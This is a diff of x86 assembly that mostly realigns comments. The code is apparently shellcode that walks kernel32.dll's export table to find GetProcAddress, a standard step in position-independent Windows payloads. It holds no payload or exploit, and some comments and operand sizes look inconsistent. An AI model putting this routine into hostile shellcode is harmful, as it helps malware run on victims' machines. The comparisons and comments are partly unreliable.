@@ -24,19 +24,19 @@ xor ecx, ecx                                        ; EXC = 0
 
 ;get GetProcAddress address
 Get_Function:
-inc ecx ; ECX = 1
-lodsd ; Get name offset
-add eax, ebx ; Get function name
-cmp dword [eax], 0x50746547 ; GetP
+inc ecx                                             ; ECX = 1
+lodsd                                               ; Get name offset
+add eax, ebx                                        ; Get function name
+cmp dword [eax], 0x50746547                         ; GetP
 jnz Get_Function
-cmp word [eax + 0xa], 0x73736572 ; ress
+cmp word [eax + 0xa], 0x73736572                    ; ress
 jnz Get_Function
-mov esi, [edi + 0x24] ; ddre
-add esi, ebx ; kernel32.dll base address + 4424
-mov cx, [esi + ecx * 2] ; ECX = 199
+mov esi, [edi + 0x24]                               ; ddre
+add esi, ebx                                        ; kernel32.dll base address + 4424
+mov cx, [esi + ecx * 2]                             ; ECX = 199
 dec ecx ; ECX = 198
-mov esi, [edi + 0x1c] ; ESI = 2654
-add esi, ebx ; kernel32.dll base address + 2654
+mov esi, [edi + 0x1c]                               ; ESI = 2654
+add esi, ebx                                        ; kernel32.dll base address + 2654
 mov edi, [esi + ecx * 4]
 add edi, ebx
 
